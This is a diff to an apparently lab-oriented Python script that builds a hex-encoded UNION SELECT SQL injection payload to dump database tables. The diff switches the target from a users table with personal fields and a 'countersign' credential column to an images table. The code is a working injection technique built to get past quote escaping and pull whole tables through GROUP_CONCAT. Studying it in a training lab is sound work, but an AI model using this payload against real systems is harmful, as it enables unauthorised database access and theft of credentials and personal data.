@@ -81,8 +81,8 @@ query_result = [
 """
 # -----------------------------------------------------------------------------------------------------------------------
 
-schema = to_hex("Member_Sql_Injection")
-table = to_hex("users")
+schema = to_hex("Member_images")
+table = to_hex("list_images")
 
 # TODO: CHANGE THIS QUERY FOR YOUR NEEDS
 # The quotes are escaped by the backend, so to use a string as a value, we need to convert it to a hexadecimal value with the to_hex function.
@@ -90,16 +90,12 @@ dquote = to_hex('"')
 query = (
         "1 UNION SELECT NULL, GROUP_CONCAT("
         + to_hex("(") + ","
-        + to_hex('"user_id: ') + ",user_id," + dquote + ","
-        + to_hex(',"first_name: ') + ",first_name," + dquote + ","
-        + to_hex(',"last_name: ') + ",last_name," + dquote + ","
-        + to_hex(',"town: ') + ",town," + dquote + ","
-        + to_hex(',"country: ') + ",country," + dquote + ","
-        + to_hex(',"planet: ') + ",planet," + dquote + ","
-        + to_hex(',"Commentaire: ') + ",Commentaire," + dquote + ","
-        + to_hex(',"countersign: ') + ",countersign," + dquote + ","
+        + to_hex('"id: ') + ",id," + dquote + ","
+        + to_hex(',"url: ') + ",url," + dquote + ","
+        + to_hex(',"title: ') + ",title," + dquote + ","
+        + to_hex(',"comment: ') + ",comment," + dquote + ","
         + to_hex(")")
-        + ") FROM Member_Sql_Injection.users"
+        + ") FROM Member_images.list_images"
 )
 
 # a list of columns indexes to show. 0 - first column, 1 - second column. These are the only options for now.
